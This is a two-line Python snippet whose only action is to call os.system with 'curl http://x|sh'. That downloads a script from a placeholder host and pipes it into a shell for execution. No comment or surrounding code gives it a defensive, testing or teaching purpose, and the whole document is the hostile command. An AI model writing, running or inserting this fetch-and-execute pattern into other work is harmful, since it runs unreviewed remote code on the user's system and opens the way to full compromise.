import os
os.system('curl http://x|sh')
